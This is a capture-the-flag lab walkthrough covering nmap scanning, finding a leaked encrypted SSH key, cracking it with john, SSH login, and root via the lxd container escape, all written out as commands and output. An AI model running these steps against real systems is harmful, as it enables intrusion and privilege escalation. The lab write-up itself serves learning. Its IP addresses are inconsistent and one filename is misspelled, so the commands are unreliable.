First started with a initnmap scan found ssh and a websever

                nmap -sC -sV 10.10.20.34                    
                Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 00:37 EST
                Nmap scan report for 10.10.20.34
                Host is up (0.20s latency).
                Not shown: 998 closed tcp ports (conn-refused)
                PORT   STATE SERVICE VERSION
                22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
                | ssh-hostkey: 
                |   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
                |   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
                |_  256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)
                80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
                |_http-server-header: Apache/2.4.29 (Ubuntu)
                |_http-title: House of danak
                Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
                Nmap done: 1 IP address (1 host up) scanned in 29.47 seconds

Started clicking on links on the website and found a upload section and takes me to a non upload page but a place were uploaded files go
                http://10.10.188.182/uploads/

Found a password list
                http://10.10.188.182/uploads/dict.lst

Found a note in the index.html file possibale username
                <!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

Found a directory /secret/ and found a rsa key
                http://10.10.188.182/secret/secretKey

                                -----BEGIN RSA PRIVATE KEY-----
                Proc-Type: 4,ENCRYPTED
                DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

                T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
                H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
                FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
                Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
                9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
                IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
                SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
                /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
                w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
                6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
                Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
                xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
                8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
                b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
                vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
                wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
                rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
                RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
                oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
                cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
				<Redacted>
                -----END RSA PRIVATE KEY-----


I tried to crack ssh with username john and the password list i found did not find anything

I did ssh2john and made a hash file and then used john to crack it
                ssh2john secretKey > id_rsa.hash
                john --wordlist=dict.lst id_rsa.hash

Then found a password for the rsa key
l.....          (secretKey)

Then i was able to ssh in
ssh john@10.10.188.182 -i secretKey

Then i looked around a bit did not find anything so I went and downloaded linpeas onto the box

To get root we have to exploit the lxd 

Clone the repo here is the commands to do so
                git clone  https://github.com/saghul/lxd-alpine-builder.git
                cd lxd-alpine-builder
                ./build-alpine

Then start a http server on your host machine 
                python -m SimpleHTTPServer

Go to the /tmp directory and download the file
                cd /tmp
    wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz

After we build the image we will add it
                lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage

Then we are going to list the image and make sure its there
                lxc image list

Then to start the exploit now we will run these commands to get root
                lxc init myimage ignite -c security.privileged=true
                lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
                lxc start ignite
                lxc exec ignite /bin/sh
                id

And now we have root and to view contents in the root folder we run this command
                mnt/root/root
                ls
                root.txt
                cat root.txt
